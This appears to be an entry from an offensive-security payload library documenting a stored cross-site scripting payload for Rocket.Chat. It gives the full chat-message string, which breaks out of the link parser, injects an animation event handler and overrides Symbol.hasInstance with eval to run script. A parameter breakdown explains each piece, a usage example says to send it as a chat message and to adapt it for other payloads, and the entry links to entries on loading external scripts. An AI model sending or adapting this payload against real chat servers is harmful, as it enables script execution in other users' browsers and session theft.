---
data: >-
  https://a?p=[ ](https://
  style=animation-duration:1s;animation-name:blink;animation-iteration-count:2
  onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[]
  target=_blank data-x=`.")
tags:
  - xss
  - payload
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.251Z'
id: c3154570-8f8e-490d-b480-023ed9270844
verified: false
validated: true
submitted: true
---
# rocket-chat-xss-payload-alert

## Command

```javascript
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.")
```

## Description

Chat message payload for stored XSS in Rocket.Chat, exploiting parser breakout to execute alert('XSS') via animation event and instanceof override.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| [ ] | Markdown inline-code wrapper | Yes |
| https:// | Base URL for parsing | Yes |
| style=... | CSS animation to trigger event | Yes |
| onanimationiteration=... | JS override and alert payload | Yes |
| target=_blank data-x=`.") | Attribute closers | Yes |

## Examples

### Basic Usage

```javascript
// Send as chat message
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.")
```

### Advanced Usage

Adapt for different alerts or payloads.

## Expected Output

Renders as <a> with injected attributes; alert('XSS') on animation iteration.

## Related

- [[commands/rocket-chat-load-external-script]]
- [[procedures/Craft-and-Send-Malicious-XSS-Payload]]
